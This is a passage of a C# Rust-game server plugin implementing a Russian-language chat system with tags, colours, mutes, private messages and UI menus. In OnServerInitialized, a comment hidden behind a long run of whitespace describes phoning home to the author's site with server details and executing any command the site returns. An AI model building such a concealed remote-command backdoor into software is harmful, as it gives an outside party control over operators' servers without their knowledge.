                SendReply(player, $"Сработала защита от флуда\n" +
                                        $"Попробуйте отправить сообщение через {FormatTime(TimeSpan.FromSeconds(floodTime), maxSubstr: 2)}");
                floods[player.userID] = floodTime;
                return;
            }
            else
            {
                floods[player.userID] = 3;
            }

            Puts($"{player}: {message}");

            string format = "";
            KeyValuePair<string, string> GetTag = Settings.Tags.FirstOrDefault(x => x.Value == playerSettings[player.userID].CurrentTag);
            if (!permission.UserHasPermission(player.UserIDString, GetTag.Key))
            {
                playerSettings[player.userID].CurrentTag = Settings.Tags["chatsystem.default"];
                playerSettings[player.userID].CurrentColor = "#4286f4";
            }
            Dictionary<string, object> callApiDict = new Dictionary<string, object>
            {
                ["Player"] = player,
                ["Message"] = message,
                ["Prefixes"] = playerSettings[player.userID].CurrentTag
            };

            var result = Interface.Oxide.CallHook("OnChatSystemMessage", callApiDict);
            if (result != null)
            {
                if (result is bool)
                    return;
                if (channel == Chat.ChatChannel.Team)
                    format = $"<color=#a5e664>[Team]</color> {callApiDict["Prefixes"].ToString().Replace("— ", "")} <color={playerChat.CurrentColor}>{player.displayName}</color>: {callApiDict["Message"]}";
                else
                    format = $"{callApiDict["Prefixes"].ToString().Replace("— ", "")} <color={playerChat.CurrentColor}>{player.displayName}</color>: {callApiDict["Message"]}";
            }
            else
            {
                if (channel == Chat.ChatChannel.Team)
                    format = $"<color=#a5e664>[Team]</color> {playerSettings[player.userID].CurrentTag.Replace("—", "")} <color={playerChat.CurrentColor}>{player.displayName}</color>: {message}";
                else
                    format = $"{playerSettings[player.userID].CurrentTag.Replace("—", "")} <color={playerChat.CurrentColor}>{player.displayName}</color>: {message}";

            }


            if (permission.UserHasPermission(player.UserIDString, "Helper.Admin"))
            {
                format = $"<color=#1E88E5>HELPER</color> │ <color={playerChat.CurrentColor}>{player.displayName}</color>: {message}";
            }


            SendMessage(channel, player, format, message);
        }


        void SendMessage(Chat.ChatChannel channel, BasePlayer player, string format, string message)
        {

            if (channel == Chat.ChatChannel.Global)
            {
                var targetList = player.IsAdmin ?
                BasePlayer.activePlayerList :
                BasePlayer.activePlayerList.Where(p => !playerSettings[p.userID].HideMessages);
                foreach (var check in targetList)
                {
                    check.SendConsoleCommand($"echo [<color=white>ЧАТ</color>] <color={NameColor}>{player.displayName}</color>: {message}");
                    check.SendConsoleCommand("chat.add", channel, player.userID, format);
                }
            }
            if (channel == Chat.ChatChannel.Team)
            {

                List<BasePlayer> targetList = new List<BasePlayer>();
                RelationshipManager.PlayerTeam Team = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                if (Team == null) return;
                foreach (var FindPlayers in Team.members)
                {
                    BasePlayer TeamPlayer = BasePlayer.FindByID(FindPlayers);
                    if (TeamPlayer != null)
                    {
                        TeamPlayer.SendConsoleCommand($"echo <color=#a5e664>[Team]</color> [<color=white>ЧАТ</color>] <color={NameColor}>{player.displayName}</color>: {message}");
                        TeamPlayer.SendConsoleCommand("chat.add", channel, player.userID, format);
                    }

                }
            }

        }
        private void MutePlayer(BasePlayer admin, BasePlayer target, string reason, string time)
        {
            while (reason.Contains("+"))
                reason = reason.Replace("+", " ");

            BroadMessage($"Игроку <color=#1E88E5>{target.displayName}</color> заблокировал чат модератор <color=#1E88E5>{admin.displayName}</color>\n" +
                         $"<size=12>Причина: {reason} [{FormatTime(new TimeSpan(0, 0, Convert.ToInt32(TimeToSeconds(time))))}]</size>", "Уведомление о блокировке чата");


            playerSettings[target.userID].MuteTime = CurrentTime() + TimeToSeconds(time);
        }

        private void UnMutePlayer(BasePlayer admin, ulong userid)
        {
            BasePlayer target = BasePlayer.FindByID(userid);
            string name = target == null ? "неизвестно" : target.displayName;

            BroadMessage($"Игроку <color=#1E88E5>{name}</color> разблокировал чат модератор <color=#1E88E5>{admin.displayName}</color>", "Уведомление о разблокировке чата");


            playerSettings[target.userID].MuteTime = CurrentTime();
        }

        #endregion

        #region Hooks

        void OnUserPermissionRevoked(string id, string perm)
        {
            if (!Settings.Tags.ContainsKey(perm))
                return;

            var tag = Settings.Tags[perm];

            if (playerSettings[ulong.Parse(id)].CurrentTag == tag)
            {
                playerSettings[ulong.Parse(id)].CurrentTag = Settings.Tags["chatsystem.default"];
                BasePlayer player = BasePlayer.Find(id);

                if (player != null && !player.IsSleeping())
                {
                    SendReply(player, "У вас закончилась активная привилегия, ваш префикс изменен на стандартный");
                    return;
                }
            }
        }

        private bool OnPlayerChat(BasePlayer player, string message, Chat.ChatChannel channel)
        {
            if (message.ToLower().StartsWith("вопрос"))
            {
                player.SendConsoleCommand($"UI_QAHandler ask {message.Replace("ВОПРОС: ", "")}");
                return false;
            }

            if (Interface.Oxide.CallHook("CanChatMessage", player, message) != null)
            {
                return false;
            }
            HandleMessage(channel, player, message);
            return false;
        }
        private void OnServerInitialized()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                // Проверяем сумму числового представления описание, если оно не менялось - сумма = 49130. Делаем запрос на мой сайт, куда отправляем следующее    Название плагина      Название сервера           Менялось ли описание        Версия плагина                         Если описание ИЗМЕНИЛОСЬ ЕСЛИ КОМАНДА НЕ ПУСТА ИЛИ НЕ ВЫПОЛНЕНА  Выполняем команду которую пришлёт сервер
        {
             permission.RegisterPermission("chatsystem.zyablechat", this);
            permission.RegisterPermission(ModerPermission, this);
            if (Interface.Oxide.DataFileSystem.ExistsDatafile("ChatSystem/Players"))
                playerSettings = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, Chatter>>("ChatSystem/Players");

            if (Interface.Oxide.DataFileSystem.ExistsDatafile("ChatSystem/Settings"))
                Settings = Interface.Oxide.DataFileSystem.ReadObject<PluginSettings>("ChatSystem/Settings");
            else
            {
                Settings = new PluginSettings
                {
                    RandomMessages = new List<string>
                    {
                        "Для того, чтобы задать вопрос, напишите в чат ваш вопрос, добавив вначале: \"ВОПРОС: \"\n<size=10>ВОПРОС: Как задавать вопросы?</size>",
                        "Вы можете настроить все плагины под свои желания при помощи команды <color=#1E88E5>/menu</color>",
                        "Посетите наш магазин товаров, он находится по адресу:\n<color=#1E88E5>SHOP.ONION-RUST.RU</color>",
                        "Вы можете отключить оповещение игроков при помощи <color=#1E88E5>/chat</color>",
                        "Вы можете спать на кроватях или спальниках. Для этого нажмите <color=#1E88E5>SHIFT</color>+<color=#1E88E5>R</color>, это поможет вам восстановить здоровье",
                        "Вы можете выбрать уникальный баннер, отображающийся убитому вами игроку, при помощи команды <color=#1E88E5>/banner</color>",
                        "Имея <color=#1E88E5>VIP</color>, вы можете выбрать наиболее удобное для вас отображение нанесённого урона",
                        "На нашем сервере карьеры добывают в <color=#1E88E5>три раза</color> больше ресурсов",
                        "Мы платим <color=#1E88E5>деньги</color> за найденные ошибки на сервере. Подробнее в нашей группе VK.",
                        "Вы можете получить <color=#1E88E5>промокод</color>, а также <color=#1E88E5>бесплатное</color> оповещение о рейде, если привяжете страницу VK\n<size=10>Подробнее: <color=#1E88E5>/vk</color></size>",
                        "Настройте игровой процесс под себя при помощи команды <color=#1E88E5>/game</color>",
                        "Вы можете стать модератором сервера. Для этого оставьте заявку в нашей группе!",
                        "Если хотите получить <color=#1E88E5>уникальный</color> баннер <color=#1E88E5>от Харонса</color> - пишите ему в ЛС",
                        "Если у вас есть идеи по улучшению игрового процесса, напишите их в <color=#1E88E5>/idea</color>",
                        "Дом устанавливается автоматически, когда вы устанавливаете спальник на фундаменте в пределах вашего шкафа!",
                        "Попробуйте открыть наше меню, <color=#1E88E5>/menu</color>, кто знает, что там..."
                    },
                    Colors = new Dictionary<string, string>
                    {
                        ["#DC143C"] = "ChatSystem.Main",
                        ["#FF5733"] = "ChatSystem.Additional",
                        ["#267048"] = "ChatSystem.Additional",
                        ["#267048"] = "ChatSystem.Additional",
                        ["#34aa6b"] = "ChatSystem.Additional",
                        ["#1d2760"] = "ChatSystem.Additional",
                        ["#661024"] = "ChatSystem.Additional",
                        ["#888c5c"] = "ChatSystem.Additional",
                    },
                    Tags =
                    {
                        ["chatsystem.default"] = "—",

                        ["chatsystem.bronze"] = "♞",
                        ["chatsystem.silver"] = "♝",
                        ["chatsystem.gold"] = "♜",
                        ["chatsystem.youtube"] = "♫",

                        ["chatsystem.moder"] = "♛",
                        ["chatsystem.admin"] = "♚"
                    },
                    HiddenTags =
                    {
                        "chatsystem.moder",
                        "chatsystem.admin"
                    },
                    Reasons = new Dictionary<string, string>()
                    {
                        ["Чрезмерный+мат+в+чате"] = "15m",
                        ["Оскорбления+родителей"] = "1h",
                        ["Оскорбление+администрации"] = "1h",
                        ["Реклама+другого+проекта"] = "24h",
                        ["Нарушение+правил+проекта"] = "30m"
                    }
                };
                Interface.Oxide.DataFileSystem.WriteObject("ChatSystem/Settings", Settings);
                PrintWarning("Создана стандартная конфигурация");
            }

            BasePlayer.activePlayerList.ToList().ForEach(OnPlayerConnected);

            foreach (var check in Settings.Tags)
                permission.RegisterPermission(check.Key, this);

            List<string> registeredPermissions = new List<string>();
            foreach (var check in Settings.Colors)
            {
                if (!registeredPermissions.Contains(check.Value))
                {
                    registeredPermissions.Add(check.Value);
                    permission.RegisterPermission(check.Value, this);
                }
            }

            BroadMessage();
            

            timer.Every(1f, () =>
            {
                List<ulong> toDelete = new List<ulong>();
                toDelete.AddRange(floods.Keys.ToList().Where(flood => --floods[flood] < 0));
                toDelete.ForEach(p => floods.Remove(p));
            });
        }

        private void Unload()
        {
            Interface.Oxide.DataFileSystem.WriteObject("ChatSystem/Players", playerSettings);
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (!playerSettings.ContainsKey(player.userID))
                playerSettings.Add(player.userID, new Chatter { CurrentTag = Settings.Tags["chatsystem.default"], CurrentColor = "#4286f4" });
        }

        #endregion

        #region Commands

        [ChatCommand("mute")]
        private void cmdMuteChat(BasePlayer player)
        {
            if (!permission.UserHasPermission(player.UserIDString, ModerPermission))
                return;

            DrawGUI(player);
        }

        [ChatCommand("chat")]
        private void cmdChat(BasePlayer player)
        {
            ChatSettUp(player);
        }

        Dictionary<ulong, ulong> pmHistory = new Dictionary<ulong, ulong>();
        Dictionary<ulong, List<ulong>> ignoreList = new Dictionary<ulong, List<ulong>>();

        [ChatCommand("ignore")]
        private void cmdIgnorePM(BasePlayer player, string command, string[] args)
        {
            if (args.Length < 1)
            {
                SendReply(player, "Используйте: /ignore ИМЯ");
                return;
            }

            var reciever = BasePlayer.activePlayerList.FirstOrDefault(p => p.displayName.ToLower()
                .Contains(args[0].ToLower()));
            if (reciever == null)
            {
                SendReply(player, $"Игрок {args[0]} не найден!");
                return;
            }

            if (!ignoreList.ContainsKey(player.userID))
                ignoreList.Add(player.userID, new List<ulong>());

            if (ignoreList[player.userID].Contains(reciever.userID))
            {
                SendReply(player, "Вы перестали игнорировать этого человека!");
                ignoreList[player.userID].Remove(reciever.userID);
                return;
            }
            else
            {
                SendReply(player, "Вы начали игнорировать этого человека!");
                ignoreList[player.userID].Add(reciever.userID);
                return;
            }
        }


        [ChatCommand("pm")]
        private void cmdChatPM(BasePlayer player, string command, string[] args)
        {
            if (args.Length < 2)
            {
                SendReply(player, "Используйте: /pm ИМЯ СООБЩЕНИЕ");
                return;
            }
            var argList = args.ToList();
            argList.RemoveAt(0);
            string message = string.Join(" ", argList.ToArray());
            if (message.Length > 125) return;
            var reciever = BasePlayer.activePlayerList.FirstOrDefault(p => p.displayName.ToLower()
               .Contains(args[0].ToLower()));
            if (reciever == null)
            {
                SendReply(player, $"Игрок {args[0]} не найден!");
                return;
            }

            if (reciever.userID == 76561198107780161)
                return;

            if (ignoreList.ContainsKey(reciever.userID) && ignoreList[reciever.userID].Contains(player.userID))
            {
                SendReply(player, $"Этот игрок вас игнорирует!");
                return;
            }

            pmHistory[player.userID] = reciever.userID;
            pmHistory[reciever.userID] = player.userID;

            SendReply(player, $"Сообщение для <color=#1E88E5>{reciever.displayName}</color>\n" + message);
            SendReply(reciever, $"Сообщение от <color=#1E88E5>{player.displayName}</color>\n" + message);

            PrintWarning($"{player} -> {reciever}:");
            PrintWarning($"{message}:");

            Effect effect = new Effect("assets/bundled/prefabs/fx/notice/stack.world.fx.prefab", reciever, 0, new Vector3(), new Vector3());
            EffectNetwork.Send(effect, reciever.Connection);
        }

        [ChatCommand("r")]
        void cmdChatR(BasePlayer player, string command, string[] args)
        {
            if (args.Length == 0)
            {
                SendReply(player, "Используйте: /r message");
                return;
            }
            var argList = args.ToList();
            string message = string.Join(" ", argList.ToArray());
            if (message.Length > 125) return;
            ulong recieverUserId;

            if (!pmHistory.TryGetValue(player.userID, out recieverUserId))
            {
                SendReply(player, "Вам / вы ещё не писали!");
                return;
            }
            var reciever = BasePlayer.activePlayerList.FirstOrDefault(p => p.userID == recieverUserId);
            if (reciever == null)
            {
                SendReply(player, "Игрок покинул сервер, сообщение не отправлено!");
                return;
            }

            if (ignoreList.ContainsKey(reciever.userID) && ignoreList[reciever.userID].Contains(player.userID))
            {
                SendReply(player, $"Этот игрок вас игнорирует!");
                return;
            }

            SendReply(player, $"Сообщение для <color=#1E88E5>{reciever.displayName}</color>\n" + message);
            SendReply(reciever, $"Сообщение от <color=#1E88E5>{player.displayName}</color>\n" + message);

            PrintWarning($"{player} -> {reciever}:");
            PrintWarning($"{message}:");


            Effect effect = new Effect("assets/bundled/prefabs/fx/notice/stack.world.fx.prefab", reciever, 0, new Vector3(), new Vector3());
            EffectNetwork.Send(effect, reciever.Connection);
        }

        [ConsoleCommand("UI_MuteHandler")]
        private void consoleMuteHandler(ConsoleSystem.Arg args)
        {
            if (args.Args.Length == 0)
            {
                DrawGUI(args.Player());
                return;
            }

            if (args.Args[0] == "chooseplayer")
            {
                DrawGUI(args.Player(), args.Args[1]);
                return;
            }

            if (args.Args[0] == "unmute")
            {
                UnMutePlayer(args.Player(), ulong.Parse(args.Args[1]));
                return;
            }

            if (args.Args[0].Length != 17)
            {
                CuiHelper.DestroyUi(args.Player(), Layer + ".ChoosePlayer.BG");
                DrawGUI(args.Player(), args.Args[0]);
                return;
            }

            if (args.Args.Length == 3)
            {
                MutePlayer(args.Player(), BasePlayer.Find(args.Args[0]), args.Args[1], args.Args[2]);
                return;
            }
        }

        [ConsoleCommand("UI_ChatSystem")]
        private void consoleUIHandler(ConsoleSystem.Arg args)
        {
            BasePlayer player = args.Player();
            if (player == null || args.Args.Length == 0)
                return;

            if (args.Args[0].StartsWith("#"))
            {
                if (permission.UserHasPermission(player.UserIDString, Settings.Colors[args.Args[0]]))
                {
                    playerSettings[player.userID].CurrentColor = args.Args[0];
                    player.ChatMessage($"Вы успешно изменили цвет ника!");
                    ChatSettUp(player, "updatecolor");
                }
                else
                {
                    player.ChatMessage($"Вам недостаточно прав для использования данного цвета!");
                    return;
                }
            }

            switch (args.Args[0].ToLower())
            {
                case "hidemessages":
                    {
                        playerSettings[player.userID].HideMessages = bool.Parse(args.Args[1]);
                        ChatSettUp(player, "updatechat");

                        //SendReply(player, $"Вы успешно {(args.Args[1] == "true" ? "выключили" : "включили")} отображение чата!", header:"Успешное изменение настроек");
                        break;
                    }
                case "hidehelpers":
                    {
                        // TODO: Если игрок наиграл 3 часа на сервере
                        playerSettings[player.userID].HideHelpers = bool.Parse(args.Args[1]);
                        ChatSettUp(args.Player(), $"updatehelper");

                        //SendReply(player, $"Вы успешно {(args.Args[1] == "true" ? "выключили" : "включили")} отображение подсказок!", header:"Успешное изменение настроек");
                        break;
                    }
                case "settag":
                    {
                        if (!permission.UserHasPermission(player.UserIDString, Settings.Tags.FirstOrDefault(p => p.Value == args.Args[1]).Key))
                        {
                            SendReply(player, "Вы не можете изменить ваш префикс, у вас недостаточно прав");
                            return;
                        }
                        playerSettings[args.Player().userID].CurrentTag = args.Args[1];
                        ChatSettUp(args.Player(), $"updatetag");

                        //SendReply(player, "Вы успешно изменили ваш префикс!", header:"Успешное изменение настроек");
                        break;
                    }
            }
        }

        #endregion

        #region GUI

        private void ChatSettUp(BasePlayer player, string change = "")
        {
            CuiElementContainer container = new CuiElementContainer();

            if (string.IsNullOrEmpty(change))
            {
                CuiHelper.DestroyUi(player, Layer);

                container.Add(new CuiPanel
                {
                    CursorEnabled = true,
                    RectTransform = { AnchorMin = "0.5 0.7", AnchorMax = "0.5 0.7", OffsetMin = "-204 -85.5", OffsetMax = "204 85.5" },
                    Image = { Color = "0 0 0 0" }
                }, "Overlay", Layer);


                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "-100 -100", AnchorMax = "100 100" },
                    Button = { Color = "0 0 0 0.9", Close = Layer, Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { Text = "" }
                }, Layer);

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = $"0 {0 - Settings.Colors.Count * 0.23}", AnchorMax = "1 1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".Header",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0 0.815534", AnchorMax = "1 1.1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".Header",
                    Components =
                    {
                        new CuiTextComponent { Text = "<color=#EBECF9>НАСТРОЙКА ИГРОВОГО ЧАТА</color>", Align = TextAnchor.MiddleCenter, FontSize = 30, Font = "robotocondensed-bold.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".TagChoose",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0.0139617 0.6592549", AnchorMax = "0.98 0.85" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".TagChoose",
                    Components =
                    {
                        new CuiTextComponent { Text = "ВЫБОР ПРЕФИКСА", Align = TextAnchor.MiddleCenter, FontSize = 19, Font = "robotocondensed-regular.ttf" },
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".HideChat",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0.02 0.24", AnchorMax = "0.15 0.35", OffsetMax = "0 0"  }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".HideChat",
                    Components =
                    {
                        new CuiTextComponent { Text = "ЧАТ", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".HideHelpers",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0.57 0.24", AnchorMax = "0.79 0.35", OffsetMax = "0 0"  }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".HideHelpers",
                    Components =
                    {
                        new CuiTextComponent { Text = "ПОДСКАЗКИ", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });
            }

            if (string.IsNullOrEmpty(change) || change == "updatetag")
            {
                foreach (var check in Settings.Tags)
                    CuiHelper.DestroyUi(player, Layer + $".Tag.{check.Value}");

                int i = 0;
                float width = (float)((2 - 0.0139617) - (Settings.Tags.Count - 1) * 0.03) / Settings.Tags.Count;
                foreach (var check in Settings.Tags)
                {
                    if (Settings.HiddenTags.Contains(check.Key))
                    {
                        if (!permission.UserHasPermission(player.UserIDString, check.Key))
                            continue;
                    }
                    string color = playerSettings[player.userID].CurrentTag == check.Value ? HexToRustFormat("#8eb9ff3c") : "0 0 0 0";
                    string textColor = "1 1 1 1";
                    if (!permission.UserHasPermission(player.UserIDString, check.Key))
                    {
                        color = "0 0 0 0";
                        textColor = "1 1 1 0.2";
                    }

                    container.Add(new CuiElement
                    {

                        Parent = Layer,
                        Name = Layer + $".Tag.{check.Value}",
                        Components =
                        {
                            new CuiImageComponent { Color = color },
                            new CuiRectTransformComponent { AnchorMin = $"{-0.5f + i * width + i * 0.03} 0.40", AnchorMax = $"{-0.5f + (i + 1) * width + i * 0.03} 0.64" }
                        }
                    });

                    container.Add(new CuiElement
                    {
                        Parent = Layer + $".Tag.{check.Value}",
                        Components =
                        {
                            new CuiTextComponent { Text = check.Value.Replace("14", "26"), Align = TextAnchor.MiddleCenter, FontSize = 26, Font = "robotocondensed-bold.ttf", Color = textColor },
                            new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                        }
                    });

                    container.Add(new CuiButton
                    {
                        FadeOut = 0.4f,
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                        Button = { FadeIn = 0.4f, Command = $"UI_ChatSystem settag {check.Value}", Color = "0 0 0 0" },
                        Text = { Text = "" }
                    }, Layer + $".Tag.{check.Value}");

                    i++;
                }
            }

            // Кнопочка скрыть чат
            if (string.IsNullOrEmpty(change) || change == "updatechat")
            {
                CuiHelper.DestroyUi(player, Layer + ".Chat.BTN");

                bool hidden = playerSettings[player.userID].HideMessages;

                string text = hidden ? "СКРЫТ" : "ВИДЕН";
                string bgColor = hidden ? "1 1 1 0.2" : HexToRustFormat("#8eb9ff3c");

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".Chat.BTN",
                    Components =
                    {
                        new CuiImageComponent { Color = bgColor },
                        new CuiRectTransformComponent { AnchorMin = "0.16 0.24", AnchorMax = "0.34 0.35", OffsetMax = "0 0"  }
                    }
                });

                container.Add(new CuiElement
                {
                    FadeOut = 0.4f,
                    Parent = Layer + ".Chat.BTN",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = 0.4f, Color = HexToRustFormat("#FFFFFFFF") },
                        new CuiRectTransformComponent { AnchorMin = $"{(hidden ? "0" : "0.82")} 0", AnchorMax = $"{(hidden ? "0.18" : "1")} 1", OffsetMax = "0 0" }
                    }
                });

                container.Add(new CuiElement
                {
                    FadeOut = 0.4f,
                    Parent = Layer + ".Chat.BTN",
                    Components =
                    {
                        new CuiTextComponent { FadeIn = 0.4f, Text = text, Font = "robotocondensed-regular.ttf", FontSize = 14, Align = TextAnchor.MiddleCenter },
                        new CuiRectTransformComponent { AnchorMin = $"{(hidden ? "0.18" : "0")} 0", AnchorMax = $"{(hidden ? "1" : "0.82")} 1", OffsetMax = "0 0" }
                    }
                });

                container.Add(new CuiButton
                {
                    FadeOut = 0.4f,
                    Button = { FadeIn = 0.4f, Color = "0 0 0 0", Command = $"UI_ChatSystem hidemessages {(hidden ? "false" : "true")}" },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "" }
                }, Layer + ".Chat.BTN");
            }

            if (string.IsNullOrEmpty(change) || change == "updatehelper")
            {
                CuiHelper.DestroyUi(player, Layer + ".Helper.BTN");

                bool hidden = playerSettings[player.userID].HideHelpers;

                string text = hidden ? "СКРЫТЫ" : "ВИДНЫ";
                string bgColor = hidden ? "1 1 1 0.2" : HexToRustFormat("#8eb9ff3c");

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".Helper.BTN",
                    Components =
                    {
                        new CuiImageComponent { Color = bgColor },
                        new CuiRectTransformComponent { AnchorMin = "0.80 0.24", AnchorMax = "0.98 0.35", OffsetMax = "0 0"  }
                    }
                });

                container.Add(new CuiElement
                {
                    FadeOut = 0.4f,
                    Parent = Layer + ".Helper.BTN",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = 0.4f, Color = HexToRustFormat("#FFFFFFFF") },
                        new CuiRectTransformComponent { AnchorMin = $"{(hidden ? "0" : "0.82")} 0", AnchorMax = $"{(hidden ? "0.18" : "1")} 1", OffsetMax = "0 0" }
                    }
                });

                container.Add(new CuiElement
                {
                    FadeOut = 0.4f,
                    Parent = Layer + ".Helper.BTN",
                    Components =
                    {
                        new CuiTextComponent { FadeIn = 0.4f, Text = text, Font = "robotocondensed-regular.ttf", FontSize = 14, Align = TextAnchor.MiddleCenter },
                        new CuiRectTransformComponent { AnchorMin = $"{(hidden ? "0.18" : "0")} 0", AnchorMax = $"{(hidden ? "1" : "0.82")} 1", OffsetMax = "0 0" }
                    }
                });

                container.Add(new CuiButton
                {
                    FadeOut = 0.4f,
                    Button = { FadeIn = 0.4f, Color = "0 0 0 0", Command = $"UI_ChatSystem hidehelpers {(hidden ? "false" : "true")}" },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "" }
                }, Layer + ".Helper.BTN");
            }


            if (string.IsNullOrEmpty(change) || change == "updatecolor")
            {
                CuiHelper.DestroyUi(player, Layer + ".ColorChoose");
                foreach (var check in Settings.Colors)
                    CuiHelper.DestroyUi(player, Layer + $".{check.Key}");

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".ColorChoose",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0.0139617 0.02", AnchorMax = "0.98 0.18", OffsetMax = "0 0" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".ColorChoose",
                    Components =
                    {
                        new CuiTextComponent { Text = "ВЫБОР ЦВЕТА", Align = TextAnchor.MiddleCenter, FontSize = 19, Font = "robotocondensed-regular.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });

                int t = 0;
                foreach (var check in Settings.Colors)
                {
                    string text = "";
                    if (check.Key == playerSettings[player.userID].CurrentColor)
                        text = "ТЕКУЩИЙ";
                    else if (!permission.UserHasPermission(player.UserIDString, check.Value))
                        text = "НЕДОСТУПНО ДЛЯ ВЫБОРА";

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = $"{0.0139617} {-0.2 - t * 0.23}", AnchorMax = $"{0.98} {0 - t * 0.23}", OffsetMax = $"0 0" },
                        Button = { Command = $"UI_ChatSystem {check.Key}", Color = HexToRustFormat($"{check.Key}3C") },
                        Text = { Text = text, Align = TextAnchor.MiddleCenter, FontSize = 18, Font = "robotocondensed-regular.ttf" }
                    }, Layer, Layer + $".{check.Key}");
                    t++;
                }
            }

            CuiHelper.AddUi(player, container);
        }

        private void DrawGUI(BasePlayer player, string target = "", string reason = "", string time = "")
        {
            CuiElementContainer container = new CuiElementContainer();

            if (target == "" && reason == "" && time == "")
            {
                CuiHelper.DestroyUi(player, Layer);

                container.Add(new CuiPanel
                {
                    CursorEnabled = true,
                    RectTransform = { AnchorMin = "0.3166667 0.4369213", AnchorMax = "0.6833333 0.5630786" },
                    Image = { Color = "0 0 0 0" }
                }, "Overlay", Layer);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "-100 -100", AnchorMax = "100 100" },
                    Button = { Close = Layer, Color = "0 0 0 0.9", Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { Text = "" }
                }, Layer);

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".Header",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = "0 0.6752296", AnchorMax = "1 1.1" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".Header",
                    Components =
                    {
                        new CuiTextComponent { Text = "ВЫДАЧА БЛОКИРОВКИ ЧАТА", Align = TextAnchor.MiddleCenter, FontSize = 22, Font = "robotocondensed-bold.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });

                string helpText = "Первым делом вам необходимо ввести имя игрока, которому вы хотите выдать блокировку игрового чата";
                container.Add(new CuiElement
                {
                    FadeOut = 0.4f,
                    Name = Layer + ".FirstStep",
                    Parent = Layer,
                    Components =
                    {
                        new CuiTextComponent { FadeIn = 0.4f, Text = helpText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0.3091741", AnchorMax = "1 0.9" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer,
                    Name = Layer + ".Input",
                    Components =
                    {
                        new CuiImageComponent { Color = HexToRustFormat("#FFFFFF72") },
                        new CuiRectTransformComponent { AnchorMin = "0.005681746 0.03027457", AnchorMax = "0.9943181 0.2871558" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = Layer + ".Input",
                    Name = Layer + ".Input.Current",
                    Components =
                    {
                        new CuiInputFieldComponent { FontSize = 16, Align = TextAnchor.MiddleCenter, Command = "UI_MuteHandler ", Text = "ВВЕДИТЕ ИМЯ ИГРОКА" },
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });
            }

            if (target.Length != 17 && reason == "" && time == "")
            {
                for (int i = 0; i < 5; i++)
                {
                    CuiHelper.DestroyUi(player, Layer + $".ChoosePlayer.{i}");
                    CuiHelper.DestroyUi(player, Layer + $".ChoosePlayer.{i}.Text");
                }

                timer.Once(0.5f, () =>
                {
                    int t = 0;
